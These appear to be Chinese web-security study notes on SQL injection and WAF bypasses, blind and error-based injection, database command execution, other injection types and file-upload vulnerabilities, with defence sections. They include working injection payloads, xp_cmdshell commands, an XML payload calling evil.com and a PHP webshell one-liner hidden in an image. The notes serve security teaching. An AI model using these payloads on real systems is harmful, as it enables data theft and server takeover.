`sleep()` ==> `benchmark()`

`concat_ws()` ==> `group_concat()`

`mid()`、`substr()` ==> `substring()`

`@@user` ==> `user()`

`@@datadir` ==> `datadir()`

#### <font color="yellow">009 生僻函数</font>

MySQL/PostgreSQL支持XML函数：`Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);`

`?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))`

`SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql`

`?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));`

`and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))`

`and extractvalue(1, concat(0x5c, (select user()),0x5c))`

#### <font color="yellow">010 反引号绕过</font>

``select `version()` ``，可以用来过空格和正则，特殊情况下还可以将其做注释符用

#### <font color="yellow">011 宽字符绕过</font>

宽字节绕过主要是sql数据库编码问题造成的，在过滤单引号时，可以尝试用

`%bf%27 %df%27 %aa%27`

#### <font color="yellow">012 \n绕过</font>

\n相当于NULL字符

`select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0`

`select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0`

`select * from users where id=\nunion select 1,2,3,4,5,6,7,8,9,0`

#### <font color="yellow">013 特殊字符绕过</font>

##### <font color="yellow">0001 greatest()绕过<></font>

`select greatest(ascii(mid(user(),1,1)),150)=150;`

##### <font color="yellow">0002 mid()等绕过，</font>

`mid(user() from 1 for 1)`

`substr(user() from 1 for 1)`

`select ascii(substr(user() from 1 for 1)) < 150;`

##### <font color="yellow">0003 php中创建等waf绕过、</font>

php过滤直接用`preg_match('/('.waf.')/i',$id)`

###### <font color="yellow">a. 过滤and or</font>

> `waf = 'and|or'`
> 
> 过滤代码 `1 or 1=1`   `1 and 1=1`
> 
> 绕过方式 `1 || 1=1`   `1 && 1=1`

###### </font color="yellow">b. 过滤union</font>

> `waf = 'and|or|union'`
> 
> 过滤代码 `union select user,password from users`
> 
> 绕过方式 `1 && (select user from users where userid=1)='admin'`

###### </font color="yellow">c. 过滤where</font>

> `waf = 'and|or|union|where'`
> 
> 过滤代码 `1 && (select user from users where user_id = 1) = 'admin'`
> 
> 绕过方式 `1 && (select user from users limit 1) = 'admin'`

###### </font color="yellow">d. 过滤limit</font>

> `waf = 'and|or|union|where|limit'`
> 
> 过滤代码 `1 && (select user from users limit 1) = 'admin'`
> 
> 绕过方式 `1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin`

###### </font color="yellow">e. 过滤group by</font>

> `waf = 'and|or|union|where|limit|group by'`
> 
> 过滤代码 `1 && (select user from users group by user_id having user_id = 1) = 'admin'`
> 
> 绕过方式 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`

###### </font color="yellow">f. 过滤select</font>

> `waf = 'and|or|union|where|limit|group by|select'`
> 
> 过滤代码 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`
> 
> 绕过方式 `1 && substr(user,1,1) = 'a'`

###### </font color="yellow">g. 过滤'</font>

> `waf = 'and|or|union|where|limit|group by|select|\''`
> 
> 过滤代码 `1 && substr(user,1,1) = 'a'`
> 
> 绕过方式 `1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)`

###### </font color="yellow">h. 过滤hex</font>

> `waf = 'and|or|union|where|limit|group by|select|\'|hex'`
> 
> 过滤代码 `1 && substr(user,1,1) = unhex(61)`
> 
> 绕过方式 `1 && substr(user,1,1) = lower(conv(11,10,16)) `

###### </font color="yellow">i. 过滤substr</font>

> `waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'`
> 
> 过滤代码 `1 && substr(user,1,1) = lower(conv(11,10,16)) `
> 
> 绕过方式 `1 && lpad(user(),1,1) in 'r'`

#### <font color="yellow">014 SQL注入简介</font>

SQL注入攻击是通过将恶意的SQL查询或添加语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一

#### <font color="yellow">015 Web程序三层架构</font>

三层架构(3-tier architecture)通常意义上就是将整个业务应用划分为一下三个层面

- 界面层(User Interface layer)
- 业务逻辑层(Business Logic Layer)
- 数据访问层(Data access layer)

区分层次的目的即为了高内聚低耦合的思想

在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发

由数据库驱动的Web应用程序依从三层架构的思想也分为了以下三层

- 表示层
- 业务逻辑层(又称领域层)
- 数据访问层(又称存储层)

用户访问实验楼主页进行了如下过程

- 在Web浏览器中输入www.shiyanlou.com连接到实验楼服务器
- 业务逻辑层的Web服务器从本地存储中加载index.php脚本并解析
- 脚本连接位于数据访问层的DBMS(数据库管理系统)，并执行SQL语句
- 数据访问层的数据库管理系统返回SQL语句执行结果给Web服务器
- 业务逻辑层的Web服务器将Web页面封装成HTML格式发送给表示层的Web浏览器
- 表示层的Web浏览器解析HTML文件，将内容展示给用户

在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种线性关系

#### <font color="yellow">016 SQL注入漏洞详解</font>

SQL注入产生原因及威胁：Web服务器会向数据访问层发起SQL查询请求，如果权限验证通过就会执行SQL语句，这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险

SQL注入带来的威胁主要有以下几点

- 猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息
- 绕过认证，列如绕过验证登录网站后台
- 注入可以借助数据库的存储过程进行提权等操作

#### <font color="yellow">017 判断SQL注入点</font>

通常情况下，可能存在SQL注入漏洞的URL是类似这种形式`http://xxx.xxx.xxx/abcd.php?id=XX`

对SQL注入的判断，主要有两个方面

- 判断该带参数的URL是否存在SQL注入
- 如果存在SQL注入，那么属于哪种SQL注入

可能存在SQL注入攻击的ASP/PHP/JSP动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数

有时是整型参数，有时是字符串型参数，不能一概而论

总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入

如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大

判断是否存在SQL注入漏洞

> ```
> http://xxx/abc.php?id=1'
> ```
> 
> 如果页面返回错误，则存在SQL注入
> 
> 原因是无论字符型还是整型都会因为单引号个数不匹配而报错
> 
> 如果未报错，不代表不存在SQL注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入

判断SQL注入漏洞的类型

通常SQL注入漏洞分为2种类型

- 数字型
- 字符型

其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型

<font color="yellow">OS注入</font>

调用OS命令引起的安全隐患：Web开发所使用的编程语言中，大多数都能通过Shell执行OS(操作系统)命令，通过Shell执行OS命令时，或者开发中用到的某个方法其内部利用了Shell时，就有可能出现OS命令被任意执行的情况，这种现象被称为OS命令注入

安全隐患产生的原因：内部调用OS命令的函数以及系统调用(System Call)中，多数都通过Shell来启动命令，Shell是用来操作OS的命令行界面，如Windows中的cmd.exe、Unix系的OS中的sh、bash、csh等，通过Shell来启动命令，能够使用管道命令(Pipe)或重定向等功能的使用变的更加便捷，`system(“echo hell > a.txt”);`PHP中调用system函数，实际启动的命令，通过sh调用命令，然而，Shell提供的便利功能却会称为OS命令注入漏洞产生的根源，Shell提供了一次启动多个命令的语法，因此外界就可以在参数中做手脚，使得在原来的命令的基础上又有其他的命令被启动

在Shell中执行多条命令

shell提供了通过制定1行来启动多个程序的方法，而OS命令注入攻击就恶意利用了Shell能够启动多个程序的特性

```shell
$ echo aaa ； echo bbb#利用分号；连续执行多条命令
aaa
bbb
$ echo aaa & echo bbb#在后台和前台执行多条命令
aaa
bbb
[1] + Done echo aaa
$echo aaa && echo bbb#利用&&,如果第1个命令执行成功就执行第2个命令
aaa
bbb
$ cat aaa || echo bbb#利用||，如果第1个命令执行失败就执行第2个命令
cat: aaa:NO such file or directory
bbb
$wc `ls`#将倒引号中的字符作为命令执行
$ echo aaa | wc #利用管道符，将第一个命令的输出作为第二个命令的输入
```

Shell中的元字符：Windows的cmd.exe中能够使用&来连续执行多条命令，另外`|`(管道功能)、`&&`或`||`的用法也和Unix、Linux一样，Shell中拥有特殊意义的字符(如`；`、`|`等)被称为shell的元字符，把元字符当做普通字符使用时需要对其进行转义，而如果在指定OS命令参数的字符串中混入了SHell的元字符，就会使得攻击者添加的OS命令被执行，这也就是OS命令注入漏洞产生的原因

安全隐患的产生的原因总结：Web应用的开发语言中，有些函数的内部实现利用了Shell，如果开发者使用了这些内部调用Shell的函数，就可能会使得意料之外的OS命令被执行，这种状态被称为OS命令注入漏洞，OS命令注入漏洞的形成需要同时满足以下三个条件

- 使用了内部调用Shell的函数(system、open等)
- 将倍加传入的参数传递给内部调用的shell的函数
- 参数中shell的元字符没有被转义

解决对策：为了防范OS命令注入漏洞，有以下三种推荐方式

- 选择不调用OS命令的实现方法：不调用利用shell的功能，既能杜绝了OS命令注入漏洞混入的可能性，又消除了调用OS命令的而系统开销，能够从多方面提高应用的性能
- 不将外界输入的字符串传递给命令行参数
- 使用安全的函数对传递给OS命令参数进行转义

#### <font color="yellow">018 SQL注入</font>

注入攻击是Web安全领域中一种最为常见的攻击方式，XSS的本质相当于针对HTML的注入攻击，以及安全世界观中的数据与代码分离原则就是为了解决注入攻击而产生的

注入攻击的条件

- 用户能够控制输入
- 原本程序要执行的代码中拼接了用户输入的数据

SQL注入第一次出现在黑客rfp发布的一篇题为NT Web Technology Vulnerabilities的文章[http://www.phrack.org/issues.html?issue=54&id=8#article](http://www.phrack.org/issues.html?issue=54&id=8#article)

SQL注入的条件：用户能够控制输入(变量ShipCity)，原本程序要执行的代码中拼接了用户输入的数据，<font color="red">这个拼接非常重要，这个拼接导致了代码的注入</font>

在SQL注入的过程，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利

e.g.

> 攻击者在参数中输入`'`引起执行查询语句的语法错误，服务器直接返回了错误信息
> 
> 一句错误信息，可以知道服务器用什么作为数据库，查询语句的伪代码极有可能是其对应的语句
> 
> 错误回显披露了敏感信息，对于攻击者来说，构造SQL注入的语句就可以更加得心应手了

<font color="yellow">盲注(Blibd Injection)</font>

布尔盲注

简介及场景

> 盲注的本质就是，在页面无法给我提供回显的时候的一中继续注入的手段
> 
> 在我们输入and 1或者and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息

相关函数

`length()`函数

> `length()`函数的作用是返回字符串str的长度，以字节为单位，一个多字节字符算作多字节，这意味着，对于包含四个两字节字符的字符串，`length()`返回8，而`char_length()`返回4

`substr()`函数

> `substr()`函数从特定位置开始的字符串返回一个给定长度的子字符串
> 
> `substr()`函数有三个参数，用法为：`substr(str,pos,len)`
> 
> str参数代表待截取的字符串
> 
> pos参数代表从什么位置开始截取
> 
> len参数表示字符串截取的长度
> 
> 其他与`substr()`函数作用相似的函数有`mid()`和`substring()`函数，其用法和`substr()`函数一致

`ascii()`函数

> `ascii()`函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符

注入实现

布尔盲注用到的函数`length()`、`substr()`和`ascii()`函数

这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果

- 判断数据库名的长度
- 猜解数据库名
- 猜解表名
- 猜解字段
- 猜解数据

自动化工具

sqlmap注入工具

> 可以直接使用自动化工具进行注入，可以直接简单点，语句大概是`sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx`
> 
> random随机给一个请求头，delay多少秒尝试一次，也可以使用--safe-freq(后面跟一个数字，代表每隔几次访问一次正常链接)和thread(线程)，technique可选择注入类型，dbms选择数据库，如果有防火墙可以跟上--tamper
> 
> `sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx --random-agent --delay 3 --thread=3 --technique=B --dbms=mysql`

Burp中的爆破模块

> 直接抓取输入，`and ascii(substr(database(),1,1))=1`的数据包，放到爆破模块

但在很多时候，Web服务器关闭了错误回显，这时还有一种办法可能成功完成SQL注入

攻击者为了应对这种情况，研究出了Blibd Injection(盲注)这一技巧

盲注就是在服务器没有错误回显是完成注入攻击，服务器没有错误回显，对于攻击者来说缺少了非常重要但调试信息，所以攻击者必须找到一个方法来验证注入但SQL语句是否得到执行

最常见的盲注验证方法是构造简单条件语句，根据页面是否发生变化判断SQL语句是否得到执行，对于Web应用来说，也不会返回给用户，攻击者看到的页面结果将为空或者跳出错页面

当攻击者构造条件`and 1 = 1`时，如果页面返回正常，则说明SQL语句的`and`成功执行了那么判断id参数就是SQL注入的漏洞

盲注原理：攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断SQL漏洞是否存在

<font color="yellow">Timing Attack</font>

黑客TinKode在著名的安全邮件列表Full Disclosure上公布了一些他入侵mysql.com搜获得的细节

<font color="red">利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack</font>

#### <font color="yellow">019 数据库攻击技巧</font>

##### <font color="yellow">0001 常见的攻击技巧</font>

SQL注入是基于数据库的一种攻击，不同的数据库有着不同的功能、不同的算法和函数，因此，针对不同数据库，SQL注入的技巧也有所不同

SQL注入漏洞，仅仅可以猜解出数据库的对应版本

如下面这段Payload，如果MySQL版本是4，就会返回TRUE

```
Http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4
```

如下Payload，则是利用union select来分别确认表名admin是否存在，列名passwd是否存在

```
id=5 union all select 1,2,3 from admin
id=5 union all select 1,2,passwd from admin
```

这个过程非常繁琐，所以非常有必要使用一个自动化工具来帮助完成整个过程[http://sqlmap.sourceforge.net](http://sqlmap.sourceforge.net)

在注入攻击的过程中，常常会用到一些读写文件的技巧

如MySQL中，就可以通过`LOAD_FILE()`读取系统文件，并通过`INTO DUMPFILE`写入本地文件，当然这要求当前数据库用户有读写系统相应文件或目录的权限

除了用`INTO DUMPFILE`外，还能用`INTO OUTFILE`

区别

- `DUMPFILE`适用于汇编语言，它会将目标文件写入同一行内
- `OUTFILE`适用于纯文本文件，更适合阅读(相对于`DUMPFILE`)

写入文件的技巧，经常被用于导出一个Webshel，为攻击者的进一步攻击做铺垫

因此在设计数据库安全方案时，可以禁用普通数据库用户具备操作文件的权限

##### <font color="yellow">0002 命令执行</font>

<font color="red">在MySQL中，除了可以通过带出Webshell间接执行命令外，还可以利用用户自定义函数的技巧，即UDF(User-Defined Funcions)来执行命令</font>

在流行的数据库中，一般都支持从本地文件系统中导入一个共享文件作为自定义函数，使用如下语法可以创建UDF

```sql
CREATE FUNCTION f_name INTEGER SONAME shared_library
```

在MySQL4的服务器上，Marco Ivaldi公布了一段代码，可以通过UDF执行系统命令，尤其是当运行mysql进程的用户为root时，将直接获得root

但这段代码在MySQL5+将会受到限制，因为其创建自定义函数但过程并不符合新的版本规范，且返回值永远为0

后来，安全研究者找到了另外的方法，通过lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的函数是sys_eval()和sys_exec()

在攻击过程中，将lib_mysqludf_sys.so上传到数据库能访问到的路径下，在创建UDF之后，就可以只用sys_eval()等函数了

- `sys_eval`，执行任意命令，并输出返回
- `sys_exec`，执行任意命令，并退出码返回
- `sys_get`，获得一个环境变量
- `sys_set`，创建或修改一个环境变量

`lib_mysqludf_sys`的相关信息可以在官方网站获得[http://www.mysqludf.org/lib_mysqludf_sys/index.php](http://www.mysqludf.org/lib_mysqludf_sys/index.php)

UDF不仅仅是MySQL的特性，其他数据库也有着类似的功能，利用UDF的功能实施攻击的技巧也大同小异，查阅数据库的相关文档将会有所帮助

在MS SQL Server中，则可以使用储存过程xp_cmdshell执行系统命令

在Oracle数据库中，如果服务器同时还有Java环境，那么也有可能造成命令执行，当SQL注入后可以执行多语句的情况下，可以在Oracle中创建Java的存储过程执行系统命令

一般来说，在数据库执行系统命令，要求具有较高的权限，在数据库加固时，可以参阅官方文档给出的安全指导文档

在建立数据库账户时应该遵循最小权限原则，尽量避免给Web应用使用数据库的管理员权限

##### <font color="yellow">0003 攻击储存过程</font>

存储过程为数据库提供了强大的功能，它与UDF很像，但存储过程必须使用CALL或者EXECUTE来执行，在MS SQL Server和Oracle数据库中，都有大量内置存储过程，在注入攻击但过程中，存储过程将为攻击者提供极大的便利

在MS SQL Server中，存储过程xp_cmdshell可以说是臭名昭著了，无数的黑客教程在讲到注入SQL Server时都是使用它执行系统命令

```sql
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
EXEC master.dbo.xp_cmdshell 'ping'
```

xp_cmdshell在SQL Server 2000中默认是开启的，但在SQL Server 2005+中默认是禁止的，但是如果当前数据库用户拥有sysadmin权限，则可以使用sp_configure重新开启它，如果在SQL Server 2000中禁用了xp_cmdshell，则可以使用sp_addextendedproc开启它

除了xp_cmdshell外，还有一些其他的存储过程对攻击过程也是有帮助的

e.g.(可操作注册表的存储过程)

- `xp_regaddmultistring`
- `xp_regdeletekey`
- `xp_regdeletevalue`
- `xp_regenumkeys`
- `xp_regenumvalues`
- `xp_regread`
- `xp_regremovemultisting`
- `xp_regwrite`

此外，以下存储过程对攻击者也非常有用

- xp_servicecontrol，允许用户启动、停止服务
	
	```sql
	(exec master..xp_servicecontrol 'start','schedule'
	exec master..xp_servicecontrol 'start','server')
	```

- xp_availablemedia，显示机器上有用的驱动器
- xp_dirtree，允许获得一个目录树
- xp_enumdsn，列举服务器上的ODBC数据源
- xp_loginconfig，获取服务器安全信息
- xp_makecab，允许用户在服务器上创建一个压缩文件
- xp_ntsec_enumdomains，列举服务器可以进入的域
- xp_terminate_process，提供进程ID，终止此进程

<font color="red">除了利用存储过程外，存储过程本身也可能会存在注入漏洞</font>

##### <font color="yellow">0004 编码问题</font>

在有些时候，不同的字符编码也有可能会导致一些安全问题，在注入的历史上，曾经出现过基于字符集的注入技巧

注入攻击中常常会用到`'`、`"`等特殊字符在应用中，开发者为了安全，经常会使用转义字符`\`来转义这些特殊字符，但当数据库使用了宽字符集时，可能产生一些意想不到但漏洞

解决方法：统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异(统一设置为UTF-8)

基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题

如果因为种种原因无法统一字符编码，则需要单独实现一个用于过滤或转义的安全函数，在其中需要考虑到字符的可能范围

根据系统使用的不同字符集来限制用户输入数据的字符允许范围，以实现安全过滤

##### <font color="yellow">0005 SQL Column Truncation</font>

黑客Stefan Esser提出了一种名为SQL Column Truncation的攻击方式[http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities](http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities)

在MySQL的配置选项中，有一个sql_mode选项，当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error，这可能会导致发生一些问题

测试过程如下(MySQL5)

1. 首先开启strict模式：在strict模式下，因为输入的字符超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功
2. 然后关闭strict模式：数据库只返回一个warning信息，但数据插入成功
3. 此时如果插入两个相同的数据会有什么结果

	根据不同业务可能会造成不同的逻辑问题

	如下面这段代码

	```sql
	$userdata = null;
	if (isPasswordCorrect($username,$password))
	{
		$userdata = getUserDataByLogin($username);
		... ...
	}
	```

	它使用下面这条SQL语句来验证用户名和密码
	
	```sql
	SELECT username FROM users WHERE username = ? AND passhash = ?
	```

	但如果攻击者插入一个同名但数据，则可以通过此认证，在之后但授权过程中，如果系统仅仅通过用户名来进行授权，则可能造成一些越权访问
	
	```sql
	SELECT * FROM users WHERE username = ?
	```

在这个问题公布不久，WordPass就出现了一个真实案例

注册一个用户名为admin(55个空格)x的用户，就可以修改愿管理员的密码了

但这个漏洞并未造成严重的后果，因为攻击者在此只能修改管理员的密码，而新密码仍然会发送到管理员的邮箱

尽管如此，我们并不能忽视SQL Column Truncation的危害，因为也许下一次漏洞被利用时，就没有那么好的运气了

#### <font color="yellow">020 正确地防御SQL注入</font>

从防御的角度看，要做的事情有两个

- 找到所有的SQL注入漏洞
- 修复这些漏洞

SQL注入的防御并不是一件简单的事，开发者常常会走入一些误区，如只对用户输入做一些escape处理，而这是不够的

`mysql_real_escape_string()`仅仅会转义

- `'`
- `"`
- `\r`
- `\n`
- `NULL`
- `Control-Z`

这几个字符，在本例中SQL注入所使用的Payload完全没有用到这几个字符

那是不是在增加一些过滤字符，就可以了呢？

如处理包括()、空格在内的一些特殊字符，以及一些SQL保留字，如SELECT、INSERT等

其实，这种基于黑名单的方法，都或多或少地存在一些问题，如下面的例子

```sql
SELECT /* */passwd/* */from/* */user
SELECT(passwd)from(user)
```

不需要括号、引号的例子，其中0x61646D696E是字符串admin的十六进制编码

```sql
SELECT passwd from users where user=0x61646D696E
```

而SQL保留字中，像HAVING、ORDER BY等都有可能出现在自然语言中，用户提交的正常数据可能也会有这些单词，从而造成误杀，因此不能轻易过滤

1. 使用预编译语句

<font color="red">防御SQL注入的最佳方式，就是使用预编译语句绑定变量</font>

使用预编译语句的SQL语句语义不会发生改变，在SQL语句中，变量用？表示，攻击者无法改变SQL的结构

2. 使用储存过程

<font color="red">了使用预编译语句外，我们还可以使用安全的储存过程对抗SQL注入，使用储存过程的效果和使用预编译语句类似，其区别就是存储过程需要先将SQL语句定义在数据库中，但需要注意的是，存储过程中也有可能会存在注入问题，因此因该尽量避免在存储过程内使用动态的SQL语句</font>

如果无法避免，则因该使用严格的输入过滤或者是编码函数来处理用户的输入数据

但是有的时候，可能无法使用预编译语句或存储过程，这时候只能在此回到输入过滤和编码等方法上来

3. 检查数据类型

检查输入数据但数据类型，在很大程度上可以对抗SQL注入

其他的数据格式或类型检查也是有用的

但数据类型检查并非万能，如果需求就是需要用户提交字符串，则需要依赖其他的方法防范SQL注入

4. 使用安全函数

一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入，但前文介绍了一些编码函数被绕过但例子，因此我们需要一个足够安全但编码函数

从数据库自身的角度来看，因该使用最小权限原则，避免Web应用直接使用root、dbowner等高级权限账户直接链接数据库

如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户，Web应用使用的数据库账户不应该有创建自定义函数、操作本地文件的权限

#### <font color="yellow">021 其他注入攻击</font>

除了SQL注入外，在Web安全领域还有其他的注入攻击，这些注入攻击都有相同的特点，就是应用违背了数据与代码分离原则

1. XML注入

XML是一种常用的标记语言，通过标签对数据进行结构化表示

XML与HTML都是SGML(Standard Generalized Markup Language(标准通用标记语言))

XML与HTML一样，也存在注入攻击，甚至在注入方法上也非常类似

XML注入也需要满足注入攻击的条件，与HTML注入的修补方法类似，对用户输入数据中包含的语言本身的保留字符进行转义即可

2. 代码注入

代码注入比较特别的一点是其与命令注入往往都是有一些不安全的函数或者方法引起的，其中的典型代表就是eval()

在Java中也可以实施代码注入

JSP的动态include也可能导致代码注入

严格来说，PHP、JSP的动态include(文件包含漏洞)导致的代码执行，都可以算是一种代码注入

代码注入多见于脚本语言，有时候代码注入也易造成命令注入(Command Injection)system()函数在执行时，缺乏必要的安全检查，攻击者可以由此注入额外的命令

对抗代码注入、命令注入时，需要禁用eval()、system()等可以执行命令的函数，如果一定要使用这些函数，则需要对用户的输入数据进行处理，此外在PHP、JSP中避免动态include远程文件，或者安全地处理它

代码注入往往是由于不安全的编程习惯所造成的，危险函数因该尽量避免在开发中使用，可以在开发规范中明确指出那些函数是禁止使用的，这些危险函数一般在开发语言的官方文档中可以查遭到一些建议

3. CRLF注入

CRLF实际上是两个字符，CR是Carriage Return(ASCII 13，`\r`)，LF是Line Feed(ASCII 10，`\n`)，`\r`、`\n`都表示换行，其十六进制编码是0x0d、0x0a

CRLF常被用作不同语义之间的分隔符，因此通过注入CRLF字符，就有可能改变原有的语义

CRLF注入并非仅能用于log注入，凡事使用CRLF作为分隔符的地方都可能存在注入，如注入HTTP头

在HTTP协议中，HTTP头是通过\r、\n来分隔的，因此如果服务器端没有过滤\r、\n而又把用户输入的数据放在HTTP头中，则有可能导致安全隐患，这种在HTTP头中的CRLF注入，又可以称为Http Response Splitting

Cookie是最容易被用户控制的地方，应用经常会将一些用户信息写入Cookie中，从而被用户控制

但是HTTP Response Splitting并非只能通过两次CRLF注入到HTTP Body，有时候注入一个HTTP头，也会带来安全问题

可以说HTTP Response Splitting的危害比XSS还要大，因为他破坏了HTTP协议的完整性

对抗CRLF的方法很简单，只需要管理好\r、\n这两个保留字符即可，尤其是那些使用换行符作为分隔符的应用

#### <font color="yellow">022 总结</font>

注入攻击是应用违背了数据与代码费力原则导致的结果，它有两个条件

在对抗注入攻击时，只要牢记数据与代码分离原则，在拼凑发生的地方进行安全检查，就能避免此类问题

SQL注入是Web安全中的一个重要领域

理论上，通过设计和实施合理的安全解决方案，注入攻击是可以彻底杜绝的

### <font color="yellow">02 文件上传漏洞</font>

#### <font color="yellow">001 攻击</font>

上传漏洞与SQL注入或XSS相比，其风险更大，如果Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行

如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为

如果上传的文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行

如果上传的文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈

甚至攻击者可以直接上传一个webshell到服务器上完全控制系统或致使系统瘫痪

原理：大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验，这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全

绕过技巧

> 一般来说文件上传过程中检测部分由客户端javascript检测、服务端Content-Type类型检测、服务端path参数检测、服务端文件扩展名检测、服务端内容检测组成
> 
> 但这些检测并不完善，且都有绕过方法
> 
> - 客户端检测绕过(js检测)：利用firebug禁用js或使用burp代理工具可轻易突破
> - 服务端MIME检测绕过(Content-Type检测)：使用burp代理，修改Content-Type的参数
> - 服务端扩展名检测绕过
>     - 文件名大小写绕过，例如Php，AsP等类似的文件名
>     - 后缀名字双写嵌套，例如pphphp，asaspp等
>     - 可以利用系统会对一些特殊文件名做默认修改的系统特性绕过
>     - 可以利用asp程序中的漏洞，使用截断字符绕过
>     - 可以利用不再黑名单列表中却能够成功执行的同义后缀名绕过黑名单的限制
>     - 可以利用解析/包含漏洞配合上传一个代码注入过的白名单文件绕过
> - 服务端内容检测绕过：通过在文件中添加正常文件的标识或其他关键字符绕过

文件加载检测绕过，针对渲染加载测试

代码注入绕过，针对二次渲染测试

服务器解析漏洞

> 1. Apache解析漏洞
> 
>     Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断比如test.php.owf.rar
> 
>     .owf和.rar这两种后缀是apache不可识别解析，apache就会把wooyun.php.owf.rar解析成php
> 
>     若一个文件名abc.x1.x2.x3，Apache会从x3开始解析，如果x3不是一个能解析的扩展名，就往前解析x2以此往复，直到能遇到一个能解析的文件名为止
> 
> 2. IIS解析漏洞
> 
>     在test.asp/jkl，IIS的某些版本中会直接当成asp来解析，test.asp;jkl，IIS某些版本也会按照asp来解析，任意文件名/任意文件名.php，IIS某些版本会直接当php来解析
> 
>     IIS6.0在解析asp时有两个解析漏洞，一个是如果任意目录名包含.asp字符串，那么这个目录下的所有文件都会按照asp去解析，另一个是文件名中含有asp，就会优先当作asp来解析
> 
>     IIS7.0/7.5对php解析有所类似于Nginx的解析漏洞
> 
>     只要对任意文件名在url后面追加上字符串/任意文件名.php就会按照php去解析
> 
>     例如，上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马shell.php
> 
> 3. Nginx解析漏洞
> 
>     将shell语句，如<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>’);?>
> 
>     写在文本xx.txt中(或者shell语句直接写一句话木马，用菜刀、cknife等直连，只是容易被查杀)，然后用命令将shell语句附加在正常图片xx.jpg后copy xx.jpg/b + xx.txt/a test.jpg
> 
>     上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马shell.php

#### <font color="yellow">002 防御</font>

##### <font color="yellow">0001 系统运行时的防御</font>

- 文件上传的目录设置为不可执行，只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要
- 判断文件类型

    在判断文件类型时，可以结合使用MIME Type、后缀检查等方式，在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的
    此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码

- 使用随机数改写文件名和文件路径

    文件上传如果要执行代码，则需要用户能够访问到这个文件
    在某些环境中，用户能上传，但不能访问，如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本
    再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击

- 单独设置文件服务器的域名

    由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决

- 使用安全设备防御

